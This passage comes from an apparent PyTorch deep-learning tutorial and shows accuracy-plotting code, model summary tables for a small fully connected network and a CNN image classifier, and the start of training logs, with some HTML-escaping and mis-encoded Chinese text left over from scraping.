…
axes[0].legend() axes[1].plot(range(len(losses)),[item.detach().item() for item in train_acc],label=\u0026#39;train_acc\u0026#39;) axes[1].plot(range(len(losses)),[item.detach().item() for item in test_acc],label=\u0026#39;test_acc\u0026#39;) axes[1].set_ylabel(\u0026#39;acc_rate\u0026#39;) axes[1].set_xlabel(\u0026#39;epoch\u0026#39;) axes[1].legend() plt.tight_layout() plt.show() Model structure and parameter statistics: ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [400, 128] 2,688 BatchNorm1d-2 [400, 128] 256 ReLU-3 [400, 128] 0 Dropout-4 [400, 128] 0 Linear-5 [400, 256] 33,024 BatchNorm1d-6 [400, 256] 512 ReLU-7 [400, 256] 0 Dropout-8 [400, 256] 0 Linear-9 [400, 128] 32,896 BatchNorm1d-10 [400, 128] 256 ReLU-11 [400, 128] 0 Dropout-12 [400, 128] 0 Linear-13 [400, 4] 516 ================================================================ Total params: 70,148 Trainable params: 70,148 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.03 Forward/backward pass size (MB): 6.26 Params size (MB): 0.27 Estimated Total Size (MB): 6.56 ---------------------------------------------------------------- Epoch[0]:: | Acc on
…
_features=512), nn.BatchNorm1d(512), nn.ReLU(), nn.Dropout(0.4), nn.Linear(in_features=512,out_features=128), nn.BatchNorm1d(128), nn.ReLU(), nn.Dropout(0.4), nn.Linear(in_features=128,out_features=out_dim), ) def forward(self,X): return self.model(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) model = ImageClassifierModel() summary(model,input_size=(3,32,32),batch_size=1,device=\u0026#39;cpu\u0026#39;) ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Conv2d-1 [1, 32, 32, 32] 896 BatchNorm2d-2 [1, 32, 32, 32] 64 ReLU-3 [1, 32, 32, 32] 0 Conv2d-4 [1, 32, 32, 32] 9,248 ReLU-5 [1, 32, 32, 32] 0 MaxPool2d-6 [1, 32, 16, 16] 0 Conv2d-7 [1, 64, 16, 16] 18,496 BatchNorm2d-8 [1, 64, 16, 16] 128 ReLU-9 [1, 64, 16, 16] 0 Conv2d-10 [1, 64, 16, 16] 36,928 ReLU-11 [1, 64, 16, 16] 0 MaxPool2d-12 [1, 64, 15, 15] 0 Flatten-13 [1, 14400] 0 Linear-14 [1, 512] 7,373,312 BatchNorm1d-15 [1, 512] 1,024 ReLU-16 [1, 512] 0 Dropout-17 [1, 512] 0 Linear-18 [1, 128] 65,664 BatchNorm1d-19 [1, 128] 256 ReLU-20 [1, 128] 0 Dropout-21 [1, 128] 0 Linear-22 [1, 10] 1,290 ================================================================ Total params: 7,507,306 Trainable params: 7,507,306 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.01 Forward/backward pass size (MB): 2.18 Params size (MB): 28.64 Estimated Total Size (MB): 30.83 ---------------------------------------------------------------- æ¨¡å‹è®­ç»ƒ
…
